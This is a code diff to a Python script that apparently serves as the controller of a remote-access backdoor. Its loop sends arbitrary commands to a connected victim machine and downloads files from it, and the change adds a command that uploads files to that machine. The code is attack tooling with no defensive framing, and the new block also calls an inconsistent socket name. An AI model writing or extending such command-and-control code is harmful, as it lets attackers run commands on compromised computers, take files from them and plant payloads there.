@@ -6,6 +6,7 @@ from plyer import notification
 import nmap
 import requests
 
+os.system('clear')
 print(" _____ _    _____ _ _      ______  _____ ")
 print("/  ___| |  |____ | | |     | ___ \|  _  | ")
 print("\ `--.| | __   / / | |_   _| |_/ /| |/' |_ __   ___  ___ ")
@@ -95,6 +96,21 @@ def command_skeleton(conn):
                     f.write(file)
                     file = conn.recv(BYTES)
                 f.close()
+            elif cmd == 'upload':
+                try:
+                    conn.send(cmd.encode())
+                    path = input("[i] File to upload (include extension): ")
+                    conn.send(path.encode())
+                    f = open(path, "rb")
+                    contents = f.read()
+                    while contents:
+                        conn.send(contents)
+                        contents = f.read(BYTES)
+                    f.close()
+                    s.send('complete'.encode())
+                except FileNotFoundError:
+                    print("[i] File not found!")
+                    continue
             else:
                 conn.send(str.encode(cmd))
                 client_response = str(conn.recv(BYTES), "utf-8")
